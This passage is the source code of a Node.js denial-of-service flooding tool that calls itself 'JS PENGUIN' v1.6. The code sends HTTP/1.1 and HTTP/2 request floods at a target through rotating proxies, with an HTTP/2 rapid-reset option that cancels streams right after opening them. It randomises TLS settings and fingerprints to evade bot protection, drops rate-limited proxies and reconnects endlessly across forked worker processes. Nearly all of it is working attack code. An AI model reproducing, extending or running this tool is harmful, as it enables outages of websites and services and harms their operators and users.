    const cipher = cipher_suites[random_int(0, cipher_suites.length - 1)];
    const extension = extensions[random_int(0, extensions.length - 1)];
    const curve = elliptic_curves[random_int(0, elliptic_curves.length - 1)];

    const ja3 = `${version},${cipher},${extension},${curve}`;

    return crypto.createHash('md5').update(ja3).digest('hex');
}

const process_rate = () => {
    // console.log(`randrate: ${randrate}`);
    if (randrate === "") {
        rate = ratelimit
    } else if (randrate.includes('-')) {
        let rate_parts = randrate.split('-')
        var minimum, maximum;
        if (rate_parts.length == 2) {
            try {
                minimum = parseInt(rate_parts[0]);
                maximum = parseInt(rate_parts[1]);
                if (minimum > maximum) {
                    rate = random_int(maximum, minimum);
                } else {
                    rate = random_int(minimum, maximum)
                }
                rate = random_int(parseInt(rate_parts[0]), parseInt(rate_parts[1]))
            } catch (err) {
                rate = random_int(1, 90)
            }
        }
    } else if (randrate === "true") {
        rate = random_int(1, 128)
    } else if (randrate !== "") {
        try {
            const base_rate = parseInt(randrate)
            // console.log(`base_rate: ${base_rate}`);
            const range = rate_range(base_rate, 50);
            // console.log(`min: ${rate_range.min}, max: ${rate_range.max}`);
            rate = random_int(range.min, range.max);
        } catch (err) {
            rate = random_int(1, 90)
        }
    }

    return rate
}

function shuffle_tls_settings() {
    // const fixed_ciphers = ciphers.slice(0, ciphers.length);
    var shuffled_ciphers = ciphers
      .map(cipher => ({ cipher, sort: Math.random() }))
      .sort((a, b) => a.sort - b.sort)
      .map(({ cipher }) => cipher);
    shuffled_ciphers = shuffled_ciphers.slice(0, Math.floor(Math.random() * (shuffled_ciphers.length - 7 + 1)) + 7)

    // const fixed_sigalgs = sigalgs.slice(0, sigalgs.length);
    var shuffled_sigalgs = sigalgs
        .map(sigalg => ({ sigalg, sort: Math.random() }))
        .sort((a, b) => a.sort - b.sort)
        .map(({ sigalg }) => sigalg);
    shuffled_sigalgs = shuffled_sigalgs.slice(0, Math.floor(Math.random() * shuffled_sigalgs.length) + random_int(4, shuffled_sigalgs.length))


    // const fixed_curves = curves.slice(0, curves.length);
    var shuffled_curves = curves
        .map(curve => ({ curve, sort: Math.random() }))
        .sort((a, b) => a.sort - b.sort)
        .map(({ curve }) => curve);
    shuffled_curves = shuffled_curves.slice(0, Math.floor(Math.random() * shuffled_curves.length) + random_int(1, 2))

    return {
      shuffled_ciphers,
      shuffled_sigalgs,
      shuffled_curves,
    };
}

const start = async (host, port, proto, options = {}) => {
    // console.log(`Process ID: [${process.id}], Proxies: [${proxies.length}]`)
    // console.log(options)
    const timeout = (duration) => {
        setTimeout(async () => {
            await start(host, port, proto);
        }, duration);
    }
    // const main_interval = setInterval(async () => {
        // await timeout(Math.random() * 50);
        const proxy = new Proxy(host, port, proto);
        // console.log(`host: ${host}, proxy: ${proxy}`);
        await proxy.connect(options).then(async (socket) => {
            // console.log(`[ Proxy: ${host}:${port}, Connected ]`);
            // console.log(`socket: ${socket}`);
            var request = new Request(url.pathname);
            request.set_path(url.pathname);
            if (protocol === "http") {
                socket.on('data', (data) => {
                    // console.log(data);
                    const response = data.toString('utf8');
                        // console.log(response)
                        const status_regex = response.match(/HTTP\/1\.0 (\d{3})/);

                        if (status_regex) {
                            const status = parseInt(status_regex[1]);
                            // console.log(`${host}:${port} # HTTP1 : status: ${status}`)
                            status_codes[status] = (status_codes[status] || 0) + 1;

                            if (status == 429 && ratelimit_opt) {
                                tls_conn.emit('ratelimit', 10);
                            }
                        }
                })
                const sendHTTP = () => {
                    socket.write(headers, (err) => {
                        if (!err) {
                            setTimeout(() => {
                                sendHTTP()
                            }, slowmo ? 1000 : (1000 + (Math.random() * 10)) / ratelimit);
                        } else {
                            // console.log("connection closed");
                            proxy.close();
                        }
                    })
                }
                for (let i = 0; i < ratelimit; i++) {
                    const headers = request.build_str();
                    socket.write(headers)
                }
            }

            const { shuffled_ciphers, shuffled_sigalgs, shuffled_curves } = shuffle_tls_settings();
            // console.log(`ciphers: ${_ciphers}\nsigalgs: ${_sigalgs}\ncurves: ${_curves}\n`);
            const tls_conn = tls.connect({
                socket: socket,
                ALPNProtocols: http_opt === 1 ? ['http/1.1'] : http_opt === 2 ? ['h2'] : ['h2', 'http/1.1'],
                servername: url.hostname,
                ciphers: shuffled_ciphers.join(':'),
                ...(Math.random() < 0.50 ? { sigalgs: shuffled_sigalgs.join(':') } : {}),
                // ...(Math.random() < random_int(0, 75) / 100) ? { sigalgs: sigalgs } : {},
                ecdhCurve: shuffled_curves.join(':'), //Math.random() < 0.75 ? "X25519" : curves,
                dhparam: 'auto',
                // minVersion: versions[versions.length - 1],
                minVersion: versions[~~Math.floor[Math.random() * versions.length]],
                // maxVersion: versions[0],
                requestOCSP: true,//Math.random() < 0.50 ? true : false,
                rejectUnauthorized: false,
                honorCipherOrder: false,
                session: crypto.randomBytes(64),
                compression: true,
                ...(fingerprint_opt === true ? { fingerprint: random_fingerprint() } : {}),
            }, async () => {
                // console.log(`(${proto}://${host}:${port}) alpn: ${tls_conn.alpnProtocol}`)
                tls_conn.addListener("ratelimit", async (duration) => {
                    const proxyKey = !options.username && !options.password ? `${host}:${port}` : `${host}:${port}:${options.username}:${options.password}`;
                    const index = proxies.indexOf(proxyKey);
                    if (index > -1) proxies.splice(index, 1);
                    tls_conn.end(() => tls_conn.destroy());
                    await timeout((duration * 1000) + 1000 * Math.random());
                });
                if (tls_conn.alpnProtocol != 'h2') {
                    tls_conn.on('data', (data) => {
                        const response = data.toString('utf8');
                        const status_regex = response.match(/HTTP\/1\.1 (\d{3})/);

                        if (status_regex) {
                            const status = parseInt(status_regex[1]);
                            // console.log(`${host}:${port} # HTTP1 : status: ${status}`)
                            status_codes[status] = (status_codes[status] || 0) + 1;

                            if (status == 429 && ratelimit_opt) {
                                tls_conn.emit('ratelimit', 10);
                            }
                        }
                    });

                    const sendHTTP1 = () => {
                        request.generate_headers();
                        const headers = request.build_str();
                        tls_conn.write(headers, (err) => {
                            // console.log(`${host}:${port} # HTTP1 : request sent`)
                            if (!err) {
                                setTimeout(() => {
                                    sendHTTP1()
                                }, slowmo ? 1000 : (1000 + (Math.random() * 10)) / ratelimit)
                            } else {
                                // console.log(`${host}:${port} # HTTP1 : closed connection`)
                                // status_codes["CLOSE"] = (status_codes["CLOSE"] || 0) + 1;
                                tls_conn.end(() => tls_conn.destroy());
                            }
                        })
                    };

                    sendHTTP1();
                }

                if (http_opt === 1) tls_conn.end(() => tls_conn.destroy());

                var http2 = new Http2(host);
                let streamId = http2.id;

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(15663105, 0);

                http2.frames.push(Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 'binary'))

                const settings_frame = http2.encode_frame(0, 0x4, http2.encode_settings([
                    [SettingHeaderTableSize, 65536],
                    [SettingEnablePush, 0],
                    [SettingInitialWindowSize, 6291456],
                    [SettingMaxHeaderListSize, 262144],
                ]));

                http2.frames.push(settings_frame);
                const update_window_frame = http2.encode_frame(0, 0x8, updateWindow);
                http2.frames.push(update_window_frame);

                tls_conn.on('data', async (response) => {
                    // console.log(response.toString('utf-8'));
                    http2.data = Buffer.concat([http2.data, response]);
                        while (http2.data.length >= 9) {
                            const frame = http2.decode_frame(http2.data);
                            if (frame != null) {
                                http2.data = http2.data.subarray(frame.length + 9);
                                // console.log(`[${frame.streamID}], Type: [${frame.type}], Flags: [${frame.flags}]`);
                                if (frame.type === 0) {
                                    if (test) {
                                        console.log(`${frame.payload.toString('utf-8')}`);
                                    }
                                } else if (frame.type === 1) {
                                    const headers = http2.hpack.decode(frame.payload);
                                    const statusHeader = headers.find(header => header[0] === ':status');
                                    const cookieHeader = headers.find(header => header[0].toLowerCase() === 'set-cookie');
                                    const redirectHeader = headers.find(header => header[0] === 'location');
                        
                                    if (statusHeader) {
                                        const status_code = statusHeader[1];
                                   
                                        status_codes[status_code] = (status_codes[status_code] || 0) + 1;
                                        if (status_code === "429" && ratelimit_opt) {
                                            // console.log('ratelimited');
                                            const ratelimit_duration = headers.find(header => header[0] === 'retry-after');
                                            // console.log(`ratelimit duration: ${ratelimit_duration[1]}`);
                                            tls_conn.emit("ratelimit", (parseInt(ratelimit_duration[1])));
                                        }

                                        if (['403', '400', '429'].includes(status_code) && close_opt) {
                                            tls_conn.end(() => tls_conn.destroy());
                                        }
                                    }

                                    if (cookieHeader && cookieHeader[1]) {
                                        const set_cookie = cookieHeader[1];
                                        const current_cookies = request.find_header('cookie');
                                        if (current_cookies) {
                                            request.replace_header('cookie', `${current_cookies}, ${set_cookie}`)
                                        } else {
                                            request.add_header('cookie', set_cookie);
                                        }
                                        // const cookie_value = set_cookie.map(cookie => cookie[1].split(';')[0].trim()).join(';');
                                        // console.log(`cookieheader: ${set_cookie}`);
                                    }

                                    if (redirectHeader && redirectHeader[1]) {
                                        const redirect_url = new URL(redirectHeader[1], url.href);
                                        const redirect = {
                                            host: redirect_url.host,
                                            path: redirect_url.pathname,
                                            href: redirect_url.href,
                                        }

                                        if (redirect.host && redirect.host !== url.host) request.replace_header(":authority", redirect.host);
                                        if (redirect.path) {
                                            request.set_path(redirect.path);
                                            request.replace_header(":path", redirect.path);
                                        }
                                    }
                                } else if (frame.type == 4 && frame.flags == 0) {
                                    tls_conn.write(http2.encode_frame(0, 0x4, "", 0x1));
                                } else if (frame.type === 7) {
                                    tls_conn.end(() => tls_conn.destroy());
                                    // return
                                }
                            } else {
                                break;
                            }
                    }
                });

                tls_conn.write(Buffer.concat(http2.frames));
                const reset_types = [0x7, 0x8];

                const sendHTTP2 = () => {
                    var rate = process_rate() || ratelimit;

                    if (tls_conn.destroyed || socket.destroyed) start(host, port, proto, options);

                    const queue = [];

                    for (var x = 0; x < ratelimit; x++) {
                        request.generate_headers()

                        const packed_headers = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            http2.hpack.encode(request.headers)
                        ]);
        
                        queue.push(http2.encode_frame(streamId, 0x1, packed_headers, 0x1 | 0x4 | 0x20));
                        if (rapidreset && http2.id >= rate) {
                            queue.push(http2.encode_rst_stream(streamId, reset_types[~~Math.random(Math.floor() * reset_types.length)], 0x0));
                        }

                        const data_buffer = data_opt !== undefined ? (data_opt === "RAND" ? Buffer.from(random_string(random_int(10, 100)), 'utf-8') : Buffer.from(data_opt, 'utf-8')) : null;
                        if (data_buffer) queue.push([http2.encode_frame(streamId, 0x0, data_buffer, 0x0)])
            
                        streamId += 2;
                        http2.id += 2;
                    }

                    tls_conn.write(Buffer.concat(queue), (err) => {
                        if (!err) {
                            setTimeout(() => {
                                sendHTTP2();
                                // console.log((1000 + (Math.random() * 100)) / rate)
                            }, slowmo ? 1000 : (1000 + (Math.random() * 10)) / rate);
                        }
                    });      
                }
                sendHTTP2();
            }).once('close', () => {
                // console.log(`${host}:${port} TLS connection closed`);
                tls_conn.removeAllListeners();
                proxy.close();
                start(host, port, proto, options);
            }).once('error', (err) => {
                // console.log(`${host}:${port} TLS error: ${err.message}`);
                tls_conn.removeAllListeners();
                proxy.close();
                start(host, port, proto, options);
            }).once('end', () => {
                tls_conn.removeAllListeners();
                proxy.close();
                start(host, port, proto, options);
            });
        }).catch((err) => {
            // console.log(`[ Proxy: ${host}:${port} ], [ Err: ${err.message} ]`);
            if (checker) {
                const proxyKey = !options.username && !options.password ? `${host}:${port}` : `${host}:${port}:${options.username}:${options.password}`;
                const index = proxies.indexOf(proxyKey);
                if (index > -1) proxies.splice(index, 1);
            }
            proxy.close();
            start(host, port, proto, options);
        })
    // }, 1000);
}

if (cluster.isMaster) {
    const workers = {};

    for (var thread = 0; thread < threads; thread++) {
        cluster.fork({
            core: thread % os.cpus().length
        });
    }
    
    if (ip_opt === undefined) {
        console.log(`                                   ${'.'.yellow}
            ${'________'.yellow.bold}${'o8A888888o_'.grey.bold}
   ${'.'.yellow}       ${'_o8888888888'.yellow}${'88'.grey.bold}${'K_]'.bgBlack.white.bold}${'888888o'.grey.bold}                   ${'*'.yellow.bold}
                      ${'~~~'.yellow}${'+8888888888o'.grey.bold}
                          ${'~8888888888'.grey.bold}        ${'.'.yellow}
            ${'*'.yellow.bold}             ${'o888'}${'88888888'.grey.bold}
 ${'.'.yellow}                       ${'o88888'}${'88888888'.grey.bold}                     ${'.'.yellow}
                       ${'_888888888'}${'8888888'.grey.bold}    
                      ${'o88888888888'}${'8888888_'.grey.bold}    ${'*'.yellow.bold}
                     ${'o8888888888888'}${'8888888_'.grey.bold}
           ${'.'.yellow}        ${'_88888888888888'}${'88888888_'.grey.bold}            ${'.'.yellow.bold}
                    ${'8888888888888888'}${'88888888_'.grey.bold}
                    ${'8888888888888888'}${'888888888'.grey.bold}                      ${'*'.yellow}
 ${'*'.yellow.bold}                  ${'8888888888888888'}${'8888888888'.grey.bold}     
                    ${'8888888888888888'}${'8888888888'.grey.bold}      ${'.'.yellow}
                    ${'888888888888888'}${'8'.white.bold}${'88888888888'.grey.bold}                             
                    ${'~88888888888888'}${'88'.white.bold}${'8888888888_'.grey.bold}
              ${'*'.yellow.bold}      ${'(888888888888'}${'8888'.white.bold}${'8888888888'.grey.bold}               ${'.'.yellow}
                      ${'888888888888'}${'88888'.white.bold}${'8888888888'.grey.bold}    ${'*'.yellow.bold}
    ${'.'.yellow}                  ${'8888888888'}${'88888888'.white.bold}${'888888888_'.grey.bold}
                   ${'.'.yellow}   ${'~88888888'}${'888888888888'.white.bold}${'88888888'.grey.bold}
                         ${'+888888'}${'8888888888888'.white.bold}${'8~~~~~'.grey.bold}
                          ${'~=88'}${'8888888888888888o'.white.bold}   ${'.'.yellow}
                   ${'_=oooooooo'.yellow.bold}${'8888888888888888'.white.bold}${'88'.white}
                   ${'_o88=8888='.yellow.bold}=~${'88888888'.yellow.bold}===8${'888_'.white}    ${'@benshii'.cyan.underline} # ${colors.dim.bold(new Date().toLocaleDateString("en"))}
                    ${'~'.yellow.bold}   ${'=~~'.yellow.bold} ${'_o88888888='.yellow.bold}      ~~~      ${'JS PENGUIN'.bold} [${'v1.6'.yellow.bold}]
                            ${'~ o8=~88=~'.yellow.bold}           
    
    
        ———   ${'Method'.bold}${':'.red.bold}    [ ${'HTTP'.bold}${reqmethod.bold} ]
        ———   ${'Target'.bold}${':'.red.bold}    [ ${target.bold.underline} ]
        ———   ${'Time'.bold}${':'.red.bold}      [ ${`${time}`.bold} ${'seconds'.bold} ]
        ———   ${'Threads'.bold}${':'.red.bold}   [ ${`${threads} cores`.bold} ]
        ———   ${'Rate'.bold}${':'.red.bold}      [ ${`${ratelimit} rq/s`.bold} ]
        ———   ${'Debug'.bold}${':'.red.bold}     [ ${debug === "true" ? 'true'.green.bold : debug === "false" ? 'false'.red.bold : Boolean(debug) ? 'true'.green.bold : 'false'.red.bold} ]
    `);
    }

    cluster.on('exit', (worker, code, signal) => {
        if (signal !== 'SIGTERM' && signal !== 'SIGINT' && signal !== 'SIGTSTP') {
            cluster.fork({ core: worker.id % os.cpus().length });
        }
    });

    cluster.on("message", (worker, message) => {
        workers[worker.id] = [worker, message];
    });

    if (Boolean(debug) && debug !== "false") {
        var count = 1;
        setInterval(() => {
            let status_codes = {};
            let worker_count = 0;
            for (let w in workers) {
                if (workers[w][0].state === "online") {
                    worker_count++;
                    // console.log(workers[w]);
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (!status_codes[code]) status_codes[code] = 0;
                            status_codes[code] += st[code];
                        }
                    }
                } else {
                    // console.log(`worker state: ${workers[w][0].state}`);
                }
            }
            const statusses = Object.entries(status_codes)
                .map(([status, value]) => {
                    var color_status;
                    if (status < 500 && status >= 400 && status !== 404) {
                        color_status = status.toString().red.bold;
                    } else if (status >= 300 && status < 400) {
                        color_status = status.toString().yellow.bold;
                    } else {
                        color_status = status.toString().green.bold;
                    }
                    return `${color_status}: ${colors.underline(value)}`;
                })
                .join(', ');

            console.log(`   [${'JS/PENGUIN'.magenta.bold}] | ${colors.bold('Time')}: [${colors.underline(time-count)}], ${colors.bold('Status')}: [${statusses}]`);
            count++;
        }, 1000);
    }
} else {
    let conns = 1;
    let delay = delay_opt ? delay_opt : 5;
    let proxy_protocol = proxytype.toUpperCase();

    let active_conns = 0;

    for (var x = 0; x < conns; x++) {
        const flood_interval = setInterval(() => {
            let proxy_proto = proxy_protocol, proxy_host, proxy_port, proxy_user, proxy_pass;
            if (ip_opt) {
                var proxy_line = ip_opt;
                if (proxy_line.includes('://')) {
                    const parts = proxy_line.split('://');
                    proxy_proto = parts[0].toUpperCase();
                    proxy_line = parts[1];
                    // proxy_proto = ip_opt.split("://")[0].toUpperCase();
                    // proxy_proto = parts[0].toUpperCase();
                }
                // const proxy = ip_opt.split(':');
                const proxy = proxy_line.split(':');
                proxy_host = proxy[0]
                proxy_port = parseInt(proxy[1])
                if (proxy.length == 4) {
                    proxy_user = proxy[2]
                    proxy_pass = proxy[3]
                }
                // console.log(proxy_host, proxy_port)
                // console.log(`[ proxy_host: ${proxy_host}, proxy_port: ${Number(proxy_port)}, protocol: ${proxy_protocol.toUpperCase()}, options: ${{ username: proxy_user, password: proxy_pass }}]`)
                start(proxy_host, Number(proxy_port), proxy_proto, { username: proxy_user, password: proxy_pass })
                active_conns++
            } else {
                var proxy_line = proxies[~~Math.floor(Math.random() * proxies.length)];//proxies[~~(Math.random() * proxies.length)]
                if (proxy_line.includes('://')) {
                    const parts = proxy_line.split('://');
                    // console.log(parts)
                    proxy_proto = parts[0].toUpperCase();
                    proxy_line = parts[1];
                }
                // console.log(`proxy_line: ${proxy_line}, proxy_proto: ${proxy_proto}`);
                const proxy = proxy_line.split(':')//proxies[~~(Math.random() * proxies.length)].split(':');
                if (connections !== undefined && connections <= active_conns) clearInterval(flood_interval);
                if (proxy && proxy.length >= 2) {
                    // console.log(proxy)
                    proxy_host = proxy[0]
                    proxy_port = parseInt(proxy[1])
                    if (proxy.length == 4) {
                        proxy_user = proxy[2]
                        proxy_pass = proxy[3]
                    }
                    // console.log(proxy_host, proxy_port)
                    // console.log(`[ proxy_host: ${proxy_host}, proxy_port: ${Number(proxy_port)}, protocol: ${proxy_proto}, options: ${{ username: proxy_user, password: proxy_pass }}]`)
                    start(proxy_host, Number(proxy_port), proxy_proto, { username: proxy_user, password: proxy_pass })
                    active_conns++
                }
            }

        }, delay);
    }

    if (Boolean(debug) && debug !== "false") {
        setInterval(() => {
            if (status_queue.length >= 4) status_queue.shift();
            status_queue.push(status_codes);
            status_codes = {};
            try {
                if (process.connected) {
                    process.send(status_queue);
                }
            } catch (err) {
                console.log(err);
            }
        }, 250);
    }
}

const exit = () => process.exit(1);
setTimeout(exit, time * 1000);
